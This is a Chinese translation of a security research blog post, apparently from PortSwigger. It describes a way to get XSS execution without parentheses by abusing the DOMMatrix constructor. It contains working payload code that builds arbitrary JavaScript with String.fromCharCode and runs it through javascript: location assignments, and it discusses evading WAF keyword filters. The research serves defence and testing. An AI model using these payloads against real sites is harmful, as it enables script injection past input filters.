# 使用 DOMMatrix 实现无括号的 JavaScript

> 作者：**Gareth Heyes**（研究员）  
> Twitter：[@garethheyes](https://twitter.com/garethheyes)

- **发布时间：** 2020 年 3 月 23 日（星期一）14:03 UTC
- **更新日期：** 2020 年 9 月 8 日（星期二）10:00 UTC

偶尔你会发现看似健康的 [XSS](/web-security/cross-site-scripting) 漏洞，却又会遇到一个限制字符集，导致无法利用。一个常见的限制是网站不允许使用括号 `()`。针对这一特定挑战有两种经典解决方案，但都存在缺陷：

- [`location=name`](http://www.thespanner.co.uk/2007/09/06/window-name-trick/) 依赖外部网站，并且在 Safari 中会失败，因为 Safari 会在跨域导航时[清除 `window.name`](https://trac.webkit.org/changeset/209076/webkit/trunk/Source)。
- [`onerror=alert;throw 1`](https://portswigger.net/research/xss-without-parentheses-and-semi-colons) 则越来越多地被 WAF 拦截关键字 `throw`。

有没有第三种更好的方式？[Terjanq](https://twitter.com/terjanq) 在 [sla.ckers](https://www.reddit.com/r/Slackers/comments/ex5mmt/cool_ways_to_generate_strings_in_javascript/) 上发布了一个有趣的有限字符集挑战，我暂停了我最新的研究（出版日期待定）去寻找答案。

我当时使用的受限字符集是 `a-z A-Z';+.:=`。你可以用 `toString/valueOf` 调用函数，但不能向函数传递参数，这让它变得相当受限。而且似乎也无法提取字符串的部分内容；你只能获得对象 `toString` 值的第一个字符。例如，对象 `new RegExp` 返回 `/(?:)/`，你可以用 `valueOf` 配合 `String.prototype.charAt` 来获取第一个字符。这之所以可行，是因为 `charAt` 被调用时没有参数，于是返回第一个字符：

```javascript
x = new RegExp;
x.valueOf = String.prototype.charAt;
x + '' // 返回一个单斜杠 "/"
```

不幸的是，字符串字面量不能使用 `valueOf`，所以你连第一个字符都拿不到，更别说字符串字面量中间的任何字符了。我需要找到一个能让我生成我所没有的字符的小工具。我使用了 [Hackability Inspector](https://portswigger-labs.net/hackability/inspector/) 枚举 `window` 对象，并在每个属性上执行 JavaScript，但它没有返回任何有用的字符。在折腾了一段时间 JavaScript 后，我意识到 `new` 操作符可以让我生成大量新字符。再次使用检查器，我编写了一个脚本，对 `window` 上所有枚举的对象使用 `new` 操作符，结果在控制台中发现了一个能生成括号的构造函数：**DOMMatrix** 构造器！这个构造函数会生成一个对象，其 `toString` 值看起来像带括号的函数调用。例如，调用 DOMMatrix 构造器会产生如下内容：

```javascript
console.log(new DOMMatrix + '')
// > matrix(1, 0, 0, 1, 0, 0)
```

实际上，我可以生成一个包含括号的字符串，它调用了参数为 `1,0,0,1,0,0` 的 `matrix` 函数，但有两个问题：1）我需要控制被调用的函数；2）我需要控制传递给该函数的参数。第一个问题可以通过简单地将 `matrix` 变量赋值为某个函数来解决：

```javascript
x = new DOMMatrix;
matrix = alert;
```

对于第二个问题，我检查了 DOMMatrix 构造器返回的矩阵对象，发现它有一个属性叫 `a`，可以让我控制传递给函数的第一个参数：

```javascript
x.a = 1337;
```

组合起来，下面就是如何滥用 DOMMatrix 来调用 `alert(1337)`：

```javascript
x = new DOMMatrix;
matrix = alert;
x.a = 1337;
location = 'javascript' + ':' + x;
```

你可能好奇如何执行任意代码。传递给 `matrix` 函数的参数必须是数字，但这不成问题，因为你可以使用 `String.fromCharCode` 生成字符并发送到接收器（如 `location`）。这可以通过将 `matrix` 变量覆盖为 `String.fromCharCode`，并利用 `location` 赋值来评估矩阵代码并返回所需字符来实现。你必须使用矩阵对象的 6 个属性，否则它们会默认为 0 或 1，从而产生语法错误。然后你需要再次使用 `location` 赋值，以便将生成的字符串作为 JavaScript 执行：

```javascript
x = new DOMMatrix;
matrix = String.fromCharCode;

i = new DOMMatrix;
i.a = 106; // j
i.b = 97;  // a
i.c = 118; // v
i.d = 97;  // a
i.e = 115; // s
i.f = 99;  // c

j = new DOMMatrix;
j.a = 114; // r
j.b = 105; // i
j.c = 112; // p
j.d = 116; // t
j.e = 58;  // :
j.f = 32;  // 空格

x.a = 97;  // a
x.b = 108; // l
x.c = 101; // e
x.d = 114; // r
x.e = 116; // t
x.f = 40;  // (

y = new DOMMatrix;
y.a = 49; // 1
y.b = 51; // 3
y.c = 51; // 3
y.d = 55; // 7
y.e = 41; // )
y.f = 59; // ;

location = 'javascript:a=' + i + '+' + j + '+' + x + '+' + y + ';location=a;void 1'
```

在上面的代码中，你需要使用 `location` 两次：一次用于生成字符，第二次用于执行这些字符。末尾的 `void 1` 返回 `undefined`，防止浏览器将第二个 `location` 赋值写成 HTML。

还有另一个构造函数可以以类似的方式使用，但我们强烈怀疑我们的博客文章被复制粘贴到 WAF 黑名单中，所以暂时保密。

```html
<a href="http://subdomain1.portswigger-labs.net/safari_window_name_bypass/read.html" target="alert(1337)">PoC</a>
```
